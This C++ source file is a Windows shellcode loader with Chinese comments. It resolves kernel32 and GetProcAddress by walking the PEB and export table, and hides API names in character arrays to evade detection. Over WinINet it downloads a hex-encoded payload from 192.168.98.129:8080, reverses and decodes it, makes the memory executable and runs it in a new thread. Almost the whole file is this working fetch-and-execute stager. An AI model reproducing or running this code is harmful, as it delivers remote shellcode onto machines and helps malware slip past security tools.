#include <windows.h>
#include <stdio.h>

FARPROC getProcAddress(HMODULE hModuleBase);
extern "C" PVOID64 getKernel32();

//#pragma comment(linker, "/SUBSYSTEM:WINDOWS") 

typedef struct _UNICODE_STRING
{
	WORD Length;
	WORD MaximumLength;
	PUINT64 Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

//HMODULE getKernel32()
//{
//	PVOID64 Peb = (PVOID64)__readgsqword(0x60);
//	PVOID64 LDR_DATA_Addr = *(PVOID64**)((BYTE*)Peb + 0x18);  //0x018是LDR相对于PEB偏移   存放着LDR的基地址
//	UNICODE_STRING* FullName;
//	HMODULE hKernel32 = NULL;
//	LIST_ENTRY64* pNode = NULL;
//	pNode = (LIST_ENTRY64*)(*(PVOID64**)((BYTE*)LDR_DATA_Addr + 0x30));  //偏移到InInitializationOrderModuleList
//	DWORD Count = 0;
//	while (true)
//	{
//		FullName = (UNICODE_STRING*)((BYTE*)pNode + 0x38);//BaseDllName基于InInitialzationOrderModuList的偏移
//		if (Count == 2)
//		{
//			hKernel32 = (HMODULE)(*((ULONG64*)((BYTE*)pNode + 0x10)));//DllBase
//			break;
//		}
//		pNode = (LIST_ENTRY64*)pNode->Flink;
//		Count++;
//	}
//	return hKernel32;
//}

int my_strlen(const char* p)
{
	char* start = (char*)p;
	char* end = NULL;
	while (*p != '\0')
	{
		p++;
		end = (char*)p;
	}
	return end - start;
}

int main()
{
	typedef FARPROC(WINAPI* FN_GetProcAddress)(HMODULE hModule,  LPCSTR lpProcName);
	typedef HMODULE(WINAPI* FN_LoadLibraryA)( LPCSTR lpLibFileName);
	typedef BOOL(WINAPI* FM_VirtualProtect)( LPVOID lpAddress, SIZE_T dwSize,DWORD flNewProtect,PDWORD lpflOldProtect);
	typedef PVOID(WINAPI* FM_VirtualAlloc)( LPVOID lpAddress, SIZE_T dwSize,DWORD flAllocationType,  DWORD flProtect);
	typedef LPVOID(WINAPI* Fn_InternetOpenA)( LPCSTR lpszAgent,  DWORD dwAccessType,  LPCSTR lpszProxy,  LPCSTR lpszProxyBypass,DWORD dwFlags);
	typedef LPVOID(WINAPI* Fn_InternetConnectA)( LPVOID hInternet,  LPCSTR lpszServerName,  WORD nServerPort,  LPCSTR lpszUserName,LPCSTR lpszPassword,DWORD dwService,DWORD dwFlags,  DWORD_PTR dwContext);
	typedef LPVOID(WINAPI* Fn_HttpOpenRequestA)( LPVOID hConnect,  LPCSTR lpszVerb,LPCSTR lpszObjectName, LPCSTR lpszVersion,LPCSTR lpszReferrer,LPCSTR * lplpszAcceptTypes,DWORD dwFlags, DWORD_PTR dwContext);
	typedef BOOL(WINAPI* Fn_HttpSendRequestW)( LPVOID hRequest, LPCWSTR lpszHeaders,DWORD dwHeadersLength,LPVOID lpOptional,DWORD dwOptionalLength);
	typedef BOOL(WINAPI* Fn_InternetReadFile)( LPVOID hFile, LPVOID lpBuffer,  DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
	typedef BOOL(WINAPI* Fn_InternetCloseHandle)( LPVOID hInternet);
	typedef BOOL(WINAPI* Fn_VirtualFree)(LPVOID lpAddress,SIZE_T dwSize,DWORD dwFreeType);
	typedef HANDLE(WINAPI* Fn_CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId);
	typedef NTSTATUS (WINAPI* Fn_RtlCharToInteger)(const char *String ,ULONG  Base,PULONG Value);


	FN_GetProcAddress fn_GetProcAddress;
	FN_LoadLibraryA fn_LoadLibraryA;
	FM_VirtualAlloc fn_VirtualAlloc;
	FM_VirtualProtect fn_VirtualProtect;
	Fn_CreateThread fn_CreateThread;
	Fn_InternetOpenA fn_InternetOpenA;
	Fn_InternetConnectA fn_InternetConnectA;
	Fn_HttpOpenRequestA fn_HttpOpenRequestA;
	Fn_HttpSendRequestW fn_HttpSendRequestW;
	Fn_InternetReadFile fn_InternetReadFile;
	Fn_InternetCloseHandle fn_InternetCloseHandle;
	Fn_RtlCharToInteger fn_RtlCharToInteger;
	Fn_VirtualFree fn_VirtualFree;

	char xyLoadLibraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
	char xy_Virtualalloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c',0 };
	char xy_VirtualProtectC[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0 };
	char xy_CreateThread[] = { 'C','r','e','a','t','e','T','h','r','e','a','d',0 };
	char xy_Wininet[] = { 'W','i','n','i','n','e','t','.','d','l','l',0 };
	char xy_InternetOpenA[] = { 'I','n','t','e','r','n','e','t','O','p','e','n','A',0 };
	char xy_HttpSendRequestW[] = { 'H','t','t','p','S','e','n','d','R','e','q','u','e','s','t','W',0 };
	char xy_InternetReadFile[] = { 'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e',0 };
	char xy_InternetConnectA[] = { 'I','n','t','e','r','n','e','t','C','o','n','n','e','c','t','A',0 };
	char xy_HttpOpenRequestA[] = { 'H','t','t','p','O','p','e','n','R','e','q','u','e','s','t','A',0 };
	char xy_InternetCloseHandle[] = { 'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e',0 };
	char xy_strtol[] = { 'R','t','l','C','h','a','r','T','o','I','n','t','e','g','e','r',0}; //RtlCharToInteger
	char xy_VirtualFree[] = {'V','i','r','t','u','a','l','F','r','e','e',0};
	char xy_ntdll[] = { 'n','t','d','l','l','.','d','l','l',0 };

	fn_GetProcAddress = (FN_GetProcAddress)getProcAddress((HMODULE)getKernel32());
	fn_LoadLibraryA = (FN_LoadLibraryA)fn_GetProcAddress((HMODULE)getKernel32(), xyLoadLibraryA);
	fn_RtlCharToInteger = (Fn_RtlCharToInteger)fn_GetProcAddress(fn_LoadLibraryA(xy_ntdll), xy_strtol);
	HANDLE hd = fn_LoadLibraryA(xy_Wininet);
 	fn_VirtualAlloc = (FM_VirtualAlloc)fn_GetProcAddress((HMODULE)getKernel32(), xy_Virtualalloc);
	fn_VirtualProtect = (FM_VirtualProtect)fn_GetProcAddress((HMODULE)getKernel32(), xy_VirtualProtectC);
	fn_CreateThread = (Fn_CreateThread)fn_GetProcAddress((HMODULE)getKernel32(), xy_CreateThread);
	fn_VirtualFree = (Fn_VirtualFree)fn_GetProcAddress((HMODULE)getKernel32(), xy_VirtualFree);
	fn_InternetOpenA = (Fn_InternetOpenA)fn_GetProcAddress(fn_LoadLibraryA((LPCSTR)xy_Wininet), xy_InternetOpenA);
	fn_HttpSendRequestW = (Fn_HttpSendRequestW)fn_GetProcAddress(fn_LoadLibraryA((LPCSTR)xy_Wininet), xy_HttpSendRequestW);
	fn_InternetReadFile = (Fn_InternetReadFile)fn_GetProcAddress(fn_LoadLibraryA((LPCSTR)xy_Wininet), xy_InternetReadFile);
	fn_InternetConnectA = (Fn_InternetConnectA)fn_GetProcAddress(fn_LoadLibraryA((LPCSTR)xy_Wininet), xy_InternetConnectA);
	fn_HttpOpenRequestA = (Fn_HttpOpenRequestA)fn_GetProcAddress(fn_LoadLibraryA((LPCSTR)xy_Wininet), xy_HttpOpenRequestA);
	fn_InternetCloseHandle = (Fn_InternetCloseHandle)fn_GetProcAddress(fn_LoadLibraryA((LPCSTR)xy_Wininet), xy_InternetCloseHandle);

	if (fn_InternetCloseHandle)
	{
		printf("%p\r\n", fn_InternetCloseHandle);
	}

	DWORD BUFFER_SIZE = 0x1000000;  //我无法确定shellcode的大小，所以我尽可能开辟一个足够大的空间
	char UA[] = { 'M','o','z', 'i', 'l', 'l', 'a', '/', '5', '.', '0', '(', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', '1', '0', '.', '0', ';', ' ', 'W', 'i', 'n', '6', '4',';',' ','x','6','4',')',' ',0 };
	char http[] = { 'H','T','T','P','/','1','.','0',0 };

	DWORD wrt;
	char IP[] = { '1','9','2','.','1','6','8','.','9','8','.','1','2','9',0 };
	char file[] = { 't','e','s','t','.','t','x','t',0 };

	//初始化  
	LPVOID Readbuffer = 0;
	LPVOID hInternet = fn_InternetOpenA(UA, 1, NULL, NULL, 0);
	//链接
	DWORD_PTR dwContext = 0;
	LPVOID hConnect = fn_InternetConnectA(hInternet, IP, 8080, NULL, NULL, 3, 0x10000000, dwContext);
	//使用Get
	LPVOID hRequest = fn_HttpOpenRequestA(hConnect, NULL, file, http, NULL, NULL, 0x4C8200, 0);

	if (fn_HttpSendRequestW(hRequest, NULL, 0, NULL, 0))
	{
		Readbuffer = fn_VirtualAlloc(0, BUFFER_SIZE, MEM_COMMIT, PAGE_READWRITE);
		DWORD Buffer_Count = 0;
		while (fn_InternetReadFile(hRequest, (LPVOID)((DWORD)Readbuffer + Buffer_Count), 0x2000, &wrt))
		{
			Buffer_Count += 0x2000;
			if (wrt == 0)
			{
				break;
			}
		}
		fn_InternetCloseHandle(hInternet);
		fn_InternetCloseHandle(hConnect);
		fn_InternetCloseHandle(hRequest);
	}

	const char* hex = (char *)Readbuffer;                          
	
	DWORD StrSize = my_strlen(hex);
	DWORD MemSize = StrSize / 2;

	PVOID numbuf = fn_VirtualAlloc(NULL, StrSize, MEM_COMMIT, PAGE_READWRITE);
	char* Resstr = (char *)fn_VirtualAlloc(NULL, StrSize, MEM_COMMIT, PAGE_READWRITE);
	WORD* tmp = (WORD*)fn_VirtualAlloc(NULL,sizeof(WORD*),MEM_COMMIT,PAGE_READWRITE);
	PVOID buffer = fn_VirtualAlloc(NULL, StrSize, MEM_COMMIT, PAGE_READWRITE);

	ULONGLONG BufferCount = 0;
	BYTE num = 0;
	DWORD p = 0;

	//倒置
	for (int i = StrSize - 1; i >= 0; i--)
	{
		Resstr[p++] = hex[i];
	}

	//sscanf
	for (int i = 0; i < StrSize; i += 2)
	{
		*tmp = *(WORD*)(Resstr + i);
		fn_RtlCharToInteger((const char*)tmp, 16, (PULONG)numbuf);       // number base 16
		num = *(BYTE*)numbuf;
		*tmp = (BYTE)num;
		*((char*)(ULONGLONG)buffer + BufferCount) = *tmp;  //这里如果自己实现一个标准的memcpy，因为字符串长度比较大，所以效率会比较低，所以我选择直接操作指针。
		//my_memcpy((PVOID)((ULONGLONG)buffer + BufferCount), tmp, 1);
		BufferCount++;
	}
	fn_VirtualFree(Readbuffer,0, MEM_RELEASE);
	fn_VirtualFree(numbuf, 0, MEM_RELEASE);
	fn_VirtualFree(tmp, 0, MEM_RELEASE);

	DWORD Oldprotect = 0;
	fn_VirtualProtect(buffer, MemSize, PAGE_EXECUTE_READWRITE, &Oldprotect);
	HANDLE thba = fn_CreateThread(0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);
	WaitForSingleObject(thba, -1);
	return 0;

} 

FARPROC getProcAddress(HMODULE hModuleBase)
{
	PIMAGE_DOS_HEADER lpDosHeader = (PIMAGE_DOS_HEADER)hModuleBase;
	PIMAGE_NT_HEADERS64 lpNtHeader = (PIMAGE_NT_HEADERS64)((ULONG64)hModuleBase + lpDosHeader->e_lfanew);
	if (!lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size) {
		return NULL;
	}
	if (!lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) {
		return NULL;
	}
	PIMAGE_EXPORT_DIRECTORY lpExports = (PIMAGE_EXPORT_DIRECTORY)((ULONG64)hModuleBase + (ULONG64)lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD lpdwFunName = (PDWORD)((ULONG64)hModuleBase + (ULONG64)lpExports->AddressOfNames);
	PWORD lpword = (PWORD)((ULONG64)hModuleBase + (ULONG64)lpExports->AddressOfNameOrdinals);
	PDWORD  lpdwFunAddr = (PDWORD)((ULONG64)hModuleBase + (ULONG64)lpExports->AddressOfFunctions);

	DWORD dwLoop = 0;
	FARPROC pRet = NULL;
	for (; dwLoop <= lpExports->NumberOfNames - 1; dwLoop++) {
		char* pFunName = (char*)(lpdwFunName[dwLoop] + (ULONG64)hModuleBase);

		if (pFunName[0] == 'G' &&
			pFunName[1] == 'e' &&
			pFunName[2] == 't' &&
			pFunName[3] == 'P' &&
			pFunName[4] == 'r' &&
			pFunName[5] == 'o' &&
			pFunName[6] == 'c' &&
			pFunName[7] == 'A' &&
			pFunName[8] == 'd' &&
			pFunName[9] == 'd' &&
			pFunName[10] == 'r' &&
			pFunName[11] == 'e' &&
			pFunName[12] == 's' &&
			pFunName[13] == 's')
		{
			pRet = (FARPROC)(lpdwFunAddr[lpword[dwLoop]] + (ULONG64)hModuleBase);
			break;
		}
	}
	return pRet;
}


